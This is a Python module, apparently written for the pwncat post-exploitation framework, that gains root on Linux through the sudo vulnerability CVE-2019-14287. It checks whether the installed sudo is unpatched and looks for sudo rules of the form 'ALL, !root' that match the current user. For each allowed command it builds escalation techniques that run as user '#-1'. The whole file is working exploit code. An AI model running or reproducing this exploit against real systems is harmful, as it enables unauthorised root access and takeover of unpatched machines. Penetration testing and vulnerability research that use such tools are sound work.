#!/usr/bin/env python3

import pwncat
from pwncat.gtfobins import Capability, Stream, BinaryNotFound
from pwncat.modules.escalate import (
    EscalateModule,
    EscalateError,
    GTFOTechnique,
    Technique,
)

from packaging import version


class Module(EscalateModule):
    """
    Escalate to root using CVE-2019-14287 sudo vulnerability.
    """

    PLATFORM = pwncat.platform.Platform.LINUX

    def enumerate(self):
        """ Enumerate SUDO vulnerability """

        sudo_fixed_version = "1.8.28"

        for fact in pwncat.modules.run(
            "enumerate.software.sudo.version", progress=self.progress
        ):
            sudo_version = fact
            break

        if version.parse(sudo_version.data.version) >= version.parse(
            sudo_fixed_version
        ):
            # Patched version, no need to check privs
            return

        rules = []
        for fact in pwncat.modules.run(
            "enumerate.software.sudo.rules", progress=self.progress
        ):

            # Doesn't appear to be a user specification
            if not fact.data.matched:
                continue

            # This specifies a user that is not us
            if (
                fact.data.user != "ALL"
                and fact.data.user != pwncat.victim.current_user.name
                and fact.data.group is None
            ):
                continue

            # Check if we are part of the specified group
            if fact.data.group is not None:
                for group in pwncat.victim.current_user.groups:
                    if fact.data.group == group.name:
                        break
                else:
                    # Non of our secondary groups match, was our primary group specified?
                    if fact.data.group != pwncat.victim.current_user.group.name:
                        continue

            # The rule appears to match, add it to the list
            rules.append(fact.data)

        for rule in rules:
            userlist = [x.strip() for x in rule.runas_user.split(",")]
            if "ALL" in userlist and "!root" in userlist:
                for command in rule.commands:
                    for method in pwncat.victim.gtfo.iter_sudo(
                        command, caps=Capability.ALL
                    ):
                        yield GTFOTechnique(
                            "root", self, method, user="\\#-1", spec=command
                        )

    def human_name(self, tech: "Technique"):
        return (
            f"[cyan]{tech.method.binary_path}[/cyan] ([red]sudo CVE-2019-14287[/red])"
        )
